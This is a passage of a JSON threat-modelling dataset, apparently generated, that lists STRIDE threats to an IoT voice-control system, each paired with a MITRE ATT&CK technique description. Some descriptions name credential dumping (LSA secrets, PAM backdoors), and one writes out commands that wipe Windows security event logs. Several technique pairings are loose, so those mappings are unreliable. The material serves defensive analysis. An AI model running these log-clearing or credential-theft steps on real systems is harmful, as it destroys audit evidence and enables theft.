                "description": "Adversaries with SYSTEM access to a host may attempt to access Local Security Authority (LSA) secrets, which can contain a variety of different credential materials, such as credentials for service accounts.(Citation: Passcape LSA Secrets)(Citation: Microsoft AD Admin Tier Model)(Citation: Tilbury Windows Credentials) LSA secrets are stored in the registry at <code>HKEY_LOCAL_MACHINE\\SECURITY\\Policy\\Secrets</code>. LSA secrets can also be dumped from memory.(Citation: ired Dumping LSA Secrets)\n\n[Reg](https://attack.mitre.org/software/S0075) can be used to extract from the Registry. [Mimikatz](https://attack.mitre.org/software/S0002) can be used to extract secrets from memory.(Citation: ired Dumping LSA Secrets)",
                "id": "attack-pattern--1ecfdab8-7d59-4c98-95d4-dc41970f57fc",
                "technique_id": "T1003.004"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a vulnerability in the server-side application to gain root access.",
            "Assumptions": [
                {
                    "Assumption": "The server-side application has exploitable vulnerabilities.",
                    "Role": "System",
                    "Condition": "Unpatched or weak server software."
                },
                {
                    "Assumption": "The attacker can run arbitrary code on the server.",
                    "Role": "Attacker",
                    "Condition": "Code execution achieved."
                },
                {
                    "Assumption": "Root access allows complete control over the server.",
                    "Role": "System",
                    "Condition": "No access restrictions."
                }
            ],
            "Potential Impact": "Complete system takeover with potential for extensive damage or data theft.",
            "MITRE ATT&CK Keywords": [
                "server",
                "root",
                "exploit",
                "vulnerability"
            ],
            "mitre_technique": {
                "name": "Rootkit",
                "description": "Adversaries may use rootkits to hide the presence of programs, files, network connections, services, drivers, and other system components. Rootkits are programs that hide the existence of malware by intercepting/hooking and modifying operating system API calls that supply system information. (Citation: Symantec Windows Rootkits) \n\nRootkits or rootkit enabling functionality may reside at the user or kernel level in the operating system or lower, to include a hypervisor, Master Boot Record, or [System Firmware](https://attack.mitre.org/techniques/T1542/001). (Citation: Wikipedia Rootkit) Rootkits have been seen for Windows, Linux, and Mac OS X systems. (Citation: CrowdStrike Linux Rootkit) (Citation: BlackHat Mac OSX Rootkit)",
                "id": "attack-pattern--0f20e3cb-245b-4a61-8a91-2d93f7cb0e9b",
                "technique_id": "T1014"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker leverages insecure cloud service configurations to escalate privileges.",
            "Assumptions": [
                {
                    "Assumption": "Cloud services have misconfigurations.",
                    "Role": "System",
                    "Condition": "Improperly set permissions."
                },
                {
                    "Assumption": "The attacker has knowledge of the cloud infrastructure.",
                    "Role": "Attacker",
                    "Condition": "Understanding of cloud setup."
                },
                {
                    "Assumption": "Privilege escalation in cloud provides access to critical resources.",
                    "Role": "System",
                    "Condition": "No restrictive access policies."
                }
            ],
            "Potential Impact": "Compromise of cloud-hosted data and services.",
            "MITRE ATT&CK Keywords": [
                "cloud",
                "escalation",
                "configurations",
                "access"
            ],
            "mitre_technique": {
                "name": "Pluggable Authentication Modules",
                "description": "Adversaries may modify pluggable authentication modules (PAM) to access user credentials or enable otherwise unwarranted access to accounts. PAM is a modular system of configuration files, libraries, and executable files which guide authentication for many services. The most common authentication module is <code>pam_unix.so</code>, which retrieves, sets, and verifies account authentication information in <code>/etc/passwd</code> and <code>/etc/shadow</code>.(Citation: Apple PAM)(Citation: Man Pam_Unix)(Citation: Red Hat PAM)\n\nAdversaries may modify components of the PAM system to create backdoors. PAM components, such as <code>pam_unix.so</code>, can be patched to accept arbitrary adversary supplied values as legitimate credentials.(Citation: PAM Backdoor)\n\nMalicious modifications to the PAM system may also be abused to steal credentials. Adversaries may infect PAM resources with code to harvest user credentials, since the values exchanged with PAM components may be plain-text since PAM does not store passwords.(Citation: PAM Creds)(Citation: Apple PAM)",
                "id": "attack-pattern--06c00069-771a-4d57-8ef5-d3718c1a8771",
                "technique_id": "T1556.003"
            }
        }
    ]
},
{
    "case_number": "1",
    "batch_number": "4",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker manipulates their voice to mimic a legitimate user to gain access to IoT device controls.",
            "Assumptions": [
                {
                    "Assumption": "The system relies solely on voice recognition for authentication.",
                    "Role": "System Designer",
                    "Condition": "Current implementation lacks multi-factor authentication."
                }
            ],
            "Potential Impact": "Unauthorized access to IoT devices, risk of sensitive actions being performed by an attacker.",
            "MITRE ATT&CK Keywords": [
                "voice",
                "spoofing",
                "user impersonation",
                "authentication bypass"
            ],
            "mitre_technique": {
                "name": "Spearphishing Voice",
                "description": "Adversaries may use voice communications to elicit sensitive information that can be used during targeting. Spearphishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Spearphishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: [Impersonation](https://attack.mitre.org/techniques/T1656)) and/or creating a sense of urgency or alarm for the recipient.\n\nAll forms of phishing are electronically delivered social engineering. In this scenario, adversaries use phone calls to elicit sensitive information from victims. Known as voice phishing (or \"vishing\"), these communications can be manually executed by adversaries, hired call centers, or even automated via robocalls. Voice phishers may spoof their phone number while also posing as a trusted entity, such as a business partner or technical support staff.(Citation: BOA Telephone Scams)\n\nVictims may also receive phishing messages that direct them to call a phone number (\"callback phishing\") where the adversary attempts to collect confidential information.(Citation: Avertium callback phishing)\n\nAdversaries may also use information from previous reconnaissance efforts (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)) to tailor pretexts to be even more persuasive and believable for the victim.",
                "id": "attack-pattern--6a5d222a-a7e0-4656-b110-782c33098289",
                "technique_id": "T1598.004"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker spoofs the IP address of the client-side application to gain access to the server-side services.",
            "Assumptions": [
                {
                    "Assumption": "The system does not verify the authenticity of IP addresses beyond initial checks.",
                    "Role": "Network Administrator",
                    "Condition": "Current security lacks IP address validation mechanisms."
                }
            ],
            "Potential Impact": "Compromised server resources, unauthorized data access, potential data exfiltration.",
            "MITRE ATT&CK Keywords": [
                "network",
                "IP address spoofing",
                "server exploitation",
                "access control"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker uses a fake device to impersonate a legitimate IoT controller.",
            "Assumptions": [
                {
                    "Assumption": "The system does not employ device-level authentication.",
                    "Role": "Device Manufacturer",
                    "Condition": "Current device-to-device communication is not authenticated."
                }
            ],
            "Potential Impact": "Unauthorized control over IoT devices, leading to potential physical security risks.",
            "MITRE ATT&CK Keywords": [
                "IoT device",
                "device impersonation",
                "unauthorized control",
                "physical security"
            ],
            "mitre_technique": {
                "name": "Trusted Relationship",
                "description": "Adversaries may breach or otherwise leverage organizations who have access to intended victims. Access through trusted third party relationship abuses an existing connection that may not be protected or receives less scrutiny than standard mechanisms of gaining access to a network.\n\nOrganizations often grant elevated access to second or third-party external providers in order to allow them to manage internal systems as well as cloud-based environments. Some examples of these relationships include IT services contractors, managed security providers, infrastructure contractors (e.g. HVAC, elevators, physical security). The third-party provider's access may be intended to be limited to the infrastructure being maintained, but may exist on the same network as the rest of the enterprise. As such, [Valid Accounts](https://attack.mitre.org/techniques/T1078) used by the other party for access to internal network systems may be compromised and used.(Citation: CISA IT Service Providers)\n\nIn Office 365 environments, organizations may grant Microsoft partners or resellers delegated administrator permissions. By compromising a partner or reseller account, an adversary may be able to leverage existing delegated administrator relationships or send new delegated administrator offers to clients in order to gain administrative control over the victim tenant.(Citation: Office 365 Delegated Administration)",
                "id": "attack-pattern--9fa07bef-9c81-421e-a8e5-ad4366c5a925",
                "technique_id": "T1199"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker intercepts and modifies the data packets between the client and server to alter commands or responses.",
            "Assumptions": [
                {
                    "Assumption": "Data in transit is not encrypted end-to-end.",
                    "Role": "System Administrator",
                    "Condition": "Current configuration lacks strong encryption protocols."
                }
            ],
            "Potential Impact": "Corruption of data integrity, unauthorized actions performed by IoT devices, misleading responses to users.",
            "MITRE ATT&CK Keywords": [
                "network",
                "data interception",
                "packet manipulation",
                "encryption"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies the client-side application to send malicious commands to the server.",
            "Assumptions": [
                {
                    "Assumption": "The client-side application is not adequately protected against tampering.",
                    "Role": "Application Developer",
                    "Condition": "Current application lacks code integrity checks."
                }
            ],
            "Potential Impact": "Compromised data integrity, unauthorized control over server-side operations, risk of data leakage.",
            "MITRE ATT&CK Keywords": [
                "software",
                "application tampering",
                "code alteration",
                "integrity checks"
            ],
            "mitre_technique": {
                "name": "File System Permissions Weakness",
                "description": "Processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\n\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.\n\n### Services\n\nManipulation of Windows service binaries is one variation of this technique. Adversaries may replace a legitimate service executable with their own executable to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService). Once the service is started, either directly by the user (if appropriate access is available) or through some other means, such as a system restart if the service starts on bootup, the replaced executable will run instead of the original service executable.\n\n### Executable Installers\n\nAnother variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the <code>%TEMP%</code> directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038). Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to [Bypass User Account Control](https://attack.mitre.org/techniques/T1088). Several examples of this weakness in existing common installers have been reported to software vendors. (Citation: Mozilla Firefox Installer DLL Hijack) (Citation: Seclists Kanthak 7zip Installer)",
                "id": "attack-pattern--0ca7beef-9bbc-4e35-97cf-437384ddce6a",
                "technique_id": "T1044"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker gains access to the IoT controller's firmware and modifies it to disrupt operations.",
            "Assumptions": [
                {
                    "Assumption": "IoT controller firmware is updatable without proper security checks.",
                    "Role": "Firmware Developer",
                    "Condition": "Current firmware update process lacks authentication."
                }
            ],
            "Potential Impact": "Disrupted IoT device operations, potential physical damage, compromised control over devices.",
            "MITRE ATT&CK Keywords": [
                "firmware",
                "tampering",
                "update process",
                "IoT device"
            ],
            "mitre_technique": {
                "name": "Component Firmware",
                "description": "Some adversaries may employ sophisticated means to compromise computer components and install malicious firmware that will execute adversary code outside of the operating system and main system firmware or BIOS. This technique may be similar to [System Firmware](https://attack.mitre.org/techniques/T1019) but conducted upon other system components that may not have the same capability or level of integrity checking. Malicious device firmware could provide both a persistent level of access to systems despite potential typical failures to maintain access and hard disk re-images, as well as a way to evade host software-based defenses and integrity checks.",
                "id": "attack-pattern--10d5f3b7-6be6-4da5-9a77-0f1e2bbfcc44",
                "technique_id": "T1109"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user denies sending a specific voice command that led to critical actions on IoT devices.",
            "Assumptions": [
                {
                    "Assumption": "Actions are not adequately logged and audited.",
                    "Role": "Security Analyst",
                    "Condition": "Current logging mechanisms are insufficient."
                }
            ],
            "Potential Impact": "Difficulty in holding users accountable, potential for misuse without repercussions.",
            "MITRE ATT&CK Keywords": [
                "user behavior",
                "logging",
                "audit trails",
                "accountability"
            ],
            "mitre_technique": {
                "name": "Clear Linux or Mac System Logs",
                "description": "Adversaries may clear system logs to hide evidence of an intrusion. macOS and Linux both keep track of system or user-initiated actions via system logs. The majority of native system logging is stored under the <code>/var/log/</code> directory. Subfolders in this directory categorize logs by their related functions, such as:(Citation: Linux Logs)\n\n* <code>/var/log/messages:</code>: General and system-related messages\n* <code>/var/log/secure</code> or <code>/var/log/auth.log</code>: Authentication logs\n* <code>/var/log/utmp</code> or <code>/var/log/wtmp</code>: Login records\n* <code>/var/log/kern.log</code>: Kernel logs\n* <code>/var/log/cron.log</code>: Crond logs\n* <code>/var/log/maillog</code>: Mail server logs\n* <code>/var/log/httpd/</code>: Web server access and error logs\n",
                "id": "attack-pattern--2bce5b30-7014-4a5d-ade7-12913fe6ac36",
                "technique_id": "T1070.002"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker gains entry to the system and deletes log entries to cover their tracks.",
            "Assumptions": [
                {
                    "Assumption": "Logs are not securely stored and backed up.",
                    "Role": "Database Administrator",
                    "Condition": "Current logging infrastructure is insecure."
                }
            ],
            "Potential Impact": "Loss of audit trails, compromised forensic capabilities, inability to trace malicious activities.",
            "MITRE ATT&CK Keywords": [
                "log manipulation",
                "audit",
                "forensics",
                "data security"
            ],
            "mitre_technique": {
                "name": "Clear Windows Event Logs",
                "description": "Adversaries may clear Windows Event Logs to hide the activity of an intrusion. Windows Event Logs are a record of a computer's alerts and notifications. There are three system-defined sources of events: System, Application, and Security, with five event types: Error, Warning, Information, Success Audit, and Failure Audit.\n\n\nWith administrator privileges, the event logs can be cleared with the following utility commands:\n\n* <code>wevtutil cl system</code>\n* <code>wevtutil cl application</code>\n* <code>wevtutil cl security</code>\n\nThese logs may also be cleared through other mechanisms, such as the event viewer GUI or [PowerShell](https://attack.mitre.org/techniques/T1059/001). For example, adversaries may use the PowerShell command <code>Remove-EventLog -LogName Security</code> to delete the Security EventLog and after reboot, disable future logging.  Note: events may still be generated and logged in the .evtx file between the time the command is run and the reboot.(Citation: disable_win_evt_logging)\n\nAdversaries may also attempt to clear logs by directly deleting the stored log files within `C:\\Windows\\System32\\winevt\\logs\\`.",
                "id": "attack-pattern--6495ae23-3ab4-43c5-a94f-5638a2c31fd2",
                "technique_id": "T1070.001"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A malicious insider alters administrative logs to avoid detection after unauthorized activities.",
            "Assumptions": [
                {
                    "Assumption": "Administrative actions are not logged securely or monitored.",
                    "Role": "IT Administrator",
                    "Condition": "Current logging system lacks real-time monitoring."
                }
            ],
            "Potential Impact": "Reduced security monitoring effectiveness, potential concealment of malicious activities.",
            "MITRE ATT&CK Keywords": [
                "insider threat",
                "administrative access",
                "log alteration",
                "monitoring"
            ],
            "mitre_technique": {
                "name": "Disable or Modify Tools",
                "description": "Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.(Citation: SCADAfence_ransomware)\n\nAdversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to [Indicator Blocking](https://attack.mitre.org/techniques/T1562/006), adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection.(Citation: OutFlank System Calls)(Citation: MDSec System Calls) \n\nAdversaries may also focus on specific applications such as Sysmon. For example, the \u201cStart\u201d and \u201cEnable\u201d values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Microsoft-Windows-Sysmon-Operational</code> may be modified to tamper with and potentially disable Sysmon logging.(Citation: disable_win_evt_logging) \n\nOn network devices, adversaries may attempt to skip digital signature verification checks by altering startup configuration files and effectively disabling firmware verification that typically occurs at boot.(Citation: Fortinet Zero-Day and Custom Malware Used by Suspected Chinese Actor in Espionage Operation)(Citation: Analysis of FG-IR-22-369)\n\nIn cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.\n\nFurthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools.(Citation: chasing_avaddon_ransomware)(Citation: dharma_ransomware)(Citation: demystifying_ryuk)(Citation: doppelpaymer_crowdstrike) For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.(Citation: demystifying_ryuk)\n\nAdditionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068)), which may lead to bypassing anti-tampering features.(Citation: avoslocker_ransomware)",
                "id": "attack-pattern--ac08589e-ee59-4935-8667-d845e38fe579",
                "technique_id": "T1562.001"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker intercepts sensitive user data as it is transmitted between the client and server due to a lack of encryption.",
            "Assumptions": [
                {
                    "Assumption": "Data in transit is sent in plaintext.",
                    "Role": "Network Engineer",
                    "Condition": "Current protocols do not enforce encryption."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive information, data confidentiality breach.",
            "MITRE ATT&CK Keywords": [
                "data transmission",
                "plaintext",
                "encryption",
                "data interception"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "A cloud service compromise leads to unauthorized access to stored sensitive data.",
            "Assumptions": [
                {
                    "Assumption": "Cloud services are not configured with proper access controls.",
                    "Role": "Cloud Service Administrator",
                    "Condition": "Current cloud security policies are weak or misconfigured."
                }
            ],
            "Potential Impact": "Data leakage, unauthorized information access, compromised data confidentiality.",
            "MITRE ATT&CK Keywords": [
                "cloud services",
                "data breach",
                "access control",
                "information leakage"
            ],
            "mitre_technique": {
                "name": "Cloud Services",
                "description": "Adversaries may log into accessible cloud services within a compromised environment using [Valid Accounts](https://attack.mitre.org/techniques/T1078) that are synchronized with or federated to on-premises user identities. The adversary may then perform management actions or access cloud-hosted resources as the logged-on user. \n\nMany enterprises federate centrally managed user identities to cloud services, allowing users to login with their domain credentials in order to access the cloud control plane. Similarly, adversaries may connect to available cloud services through the web console or through the cloud command line interface (CLI) (e.g., [Cloud API](https://attack.mitre.org/techniques/T1059/009)), using commands such as <code>Connect-AZAccount</code> for Azure PowerShell, <code>Connect-MgGraph</code> for Microsoft Graph PowerShell, and <code>gcloud auth login</code> for the Google Cloud CLI.\n\nIn some cases, adversaries may be able to authenticate to these services via [Application Access Token](https://attack.mitre.org/techniques/T1550/001) instead of a username and password. ",
                "id": "attack-pattern--8861073d-d1b8-4941-82ce-dce621d398f0",
                "technique_id": "T1021.007"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker exploits a vulnerability in the server-side application to access sensitive processing data.",
            "Assumptions": [
                {
                    "Assumption": "Server-side application has unpatched security vulnerabilities.",
                    "Role": "Application Security Engineer",
                    "Condition": "Current security patching procedures are inadequate."
                }
            ],
            "Potential Impact": "Unauthorized data access, risk of data leakage, compromised data integrity.",
            "MITRE ATT&CK Keywords": [
                "application vulnerability",
                "data exposure",
                "server-side",
                "patch management"
            ],
            "mitre_technique": {
                "name": "Exploitation for Defense Evasion",
                "description": "Adversaries may exploit a system or application vulnerability to bypass security features. Exploitation of a vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.\u00a0Vulnerabilities may exist in defensive security software that can be used to disable or circumvent them.\n\nAdversaries may have prior knowledge through reconnaissance that security software exists within an environment or they may perform checks during or shortly after the system is compromised for [Security Software Discovery](https://attack.mitre.org/techniques/T1518/001). The security software will likely be targeted directly for exploitation. There are examples of antivirus software being targeted by persistent threat groups to avoid detection.\n\nThere have also been examples of vulnerabilities in public cloud infrastructure of SaaS applications that may bypass defense boundaries (Citation: Salesforce zero-day in facebook phishing attack), evade security logs (Citation: Bypassing CloudTrail in AWS Service Catalog), or deploy hidden infrastructure.(Citation: GhostToken GCP flaw)",
                "id": "attack-pattern--fe926152-f431-4baf-956c-4ad3cb0bf23b",
                "technique_id": "T1211"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker sends a flood of requests to the server-side application, overwhelming it and causing service disruption.",
            "Assumptions": [
                {
                    "Assumption": "The server-side application lacks rate limiting or DDoS protection.",
                    "Role": "Network Security Engineer",
                    "Condition": "Current defenses against traffic overload are insufficient."
                }
            ],
            "Potential Impact": "Service unavailability, disrupted user experience, potential financial losses.",
            "MITRE ATT&CK Keywords": [
                "traffic overload",
                "denial of service",
                "rate limiting",
                "DDoS protection"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "A malicious insider intentionally sabotages IoT devices by sending continuous invalid commands, rendering them non-functional.",
            "Assumptions": [
                {
                    "Assumption": "Insider has administrative access to send commands directly to IoT devices.",
                    "Role": "System Administrator",
                    "Condition": "Current access controls are weak."
                }
            ],
            "Potential Impact": "IoT device unavailability, disrupted operations, physical damage to devices.",
            "MITRE ATT&CK Keywords": [
                "insider threat",
                "device sabotage",
                "invalid commands",
                "access control"
            ],
            "mitre_technique": {
                "name": "File and Directory Permissions Modification",
                "description": "Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files.(Citation: Hybrid Analysis Icacls1 June 2018)(Citation: Hybrid Analysis Icacls2 May 2018) File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).\n\nModifications may include changing specific access rights, which may require taking ownership of a file or directory and/or elevated permissions depending on the file or directory\u2019s existing permissions. This may enable malicious activity such as modifying, replacing, or deleting specific files or directories. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via [Accessibility Features](https://attack.mitre.org/techniques/T1546/008), [Boot or Logon Initialization Scripts](https://attack.mitre.org/techniques/T1037), [Unix Shell Configuration Modification](https://attack.mitre.org/techniques/T1546/004), or tainting/hijacking other instrumental binary/configuration files via [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574).\n\nAdversaries may also change permissions of symbolic links. For example, malware (particularly ransomware) may modify symbolic links and associated settings to enable access to files from local shortcuts with remote paths.(Citation: new_rust_based_ransomware)(Citation: bad_luck_blackcat)(Citation: falconoverwatch_blackcat_attack)(Citation: blackmatter_blackcat)(Citation: fsutil_behavior) ",
                "id": "attack-pattern--65917ae0-b854-4139-83fe-bf2441cf0196",
                "technique_id": "T1222"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Malware installed on the client-side application performs continuous resource-intensive operations, leading to device slowdown.",
            "Assumptions": [
                {
                    "Assumption": "Client-side application lacks robust security measures against malware.",
                    "Role": "Application Developer",
                    "Condition": "Current malware detection is inadequate."
                }
            ],
            "Potential Impact": "Client-side application unavailability, degraded user experience, potential data integrity loss.",
            "MITRE ATT&CK Keywords": [
                "malware",
                "resource exhaustion",
                "client-side",
                "security measures"
            ],
            "mitre_technique": {
                "name": "Path Interception by PATH Environment Variable",
